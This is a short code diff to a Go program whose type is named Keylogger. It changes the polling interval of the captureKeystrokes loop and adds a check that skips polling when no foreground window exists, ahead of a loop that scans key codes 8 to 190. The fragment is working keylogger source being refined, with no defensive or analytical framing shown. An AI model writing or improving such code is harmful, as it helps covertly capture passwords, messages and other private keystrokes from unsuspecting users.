@@ -63,7 +63,12 @@ func (k *Keylogger) captureKeystrokes() error {
 		case <-k.stopCh:
 			return nil
 		default:
-			time.Sleep(10 * time.Millisecond)
+			time.Sleep(40 * time.Millisecond)
+
+			// Skip polling while the input desktop has no foreground window.
+			if hwnd, _, _ := procGetForegroundWindow.Call(); hwnd == 0 {
+				continue
+			}
 
 			// Check all printable keys and special keys
 			for vk := 8; vk <= 190; vk++ {
